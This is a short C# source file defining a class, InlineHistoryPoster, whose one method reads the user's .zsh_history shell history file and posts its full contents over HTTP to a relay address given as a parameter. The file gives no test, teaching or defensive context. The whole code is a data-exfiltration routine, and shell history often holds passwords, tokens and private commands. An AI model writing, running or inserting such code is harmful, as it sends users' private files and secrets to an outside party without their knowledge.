using System.IO;
using System.Net.Http;
using System.Threading.Tasks;

class InlineHistoryPoster
{
    static async Task Post(HttpClient client, string relay)
    {
        var history = Path.Combine("/Users/sample", ".zsh_history");
        await client.PostAsync(relay, new StreamContent(File.OpenRead(history)));
    }
}
